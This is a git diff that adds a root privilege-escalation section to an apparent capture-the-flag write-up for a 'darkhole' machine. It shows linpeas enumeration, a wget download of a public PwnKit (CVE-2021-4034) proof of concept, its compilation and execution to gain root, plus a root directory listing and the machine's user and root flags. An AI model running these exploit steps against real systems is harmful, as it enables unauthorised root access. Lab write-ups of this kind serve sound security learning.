@@ -207,6 +207,43 @@ cyberctfd{0yjA5vhJWYkTXX2UALbw8Q7yMKqASU73}
 now we can login via ssh with `john:root123` using `ssh john@$IP` to close the reverse shell.
 
 
+## getting root
+
+with the john user, run [linpeas](https://github.com/carlospolop/PEASS-ng) ([Output](linpeas.txt)) to search for ways to escalate privilege.
+
+the logs show a possibility for CVE-2021-4034.
+
+download the [PoC for PwnKit](https://github.com/arthepsy/CVE-2021-4034), compile and run it.
+
+```bash
+john@darkhole:~$ wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c
+2022-06-14 16:24:48 (116 MB/s) - ‘cve-2021-4034-poc.c’ saved [1267/1267]
+
+john@darkhole:~$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
+
+john@darkhole:~$ ./cve-2021-4034-poc 
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(john)
+
+# ls -lah /root
+total 44K
+drwx------  6 root root 4.0K Jul 17  2021 .
+drwxr-xr-x 20 root root 4.0K Jul 15  2021 ..
+-rw-------  1 root root 3.0K Jun 14 15:29 .bash_history
+-rw-r--r--  1 root root 3.1K Dec  5  2019 .bashrc
+drwx------  2 root root 4.0K Jul 17  2021 .cache
+drwxr-xr-x  3 root root 4.0K Jul 17  2021 .local
+-rw-------  1 root root   18 Jul 15  2021 .mysql_history
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+drwx------  2 root root 4.0K Jul 15  2021 .ssh
+-rw-r--r--  1 root root   44 May 15 15:37 root.txt
+drwxr-xr-x  3 root root 4.0K Jul 15  2021 snap
+
+# cat /root/root.txt
+cyberctfd{lBCz8J3tRZgCqUY3O8QQygKuIzURuLql}
+```
+
 ## Flags
 
 User: `cyberctfd{0yjA5vhJWYkTXX2UALbw8Q7yMKqASU73}`
+Root: `cyberctfd{lBCz8J3tRZgCqUY3O8QQygKuIzURuLql}`
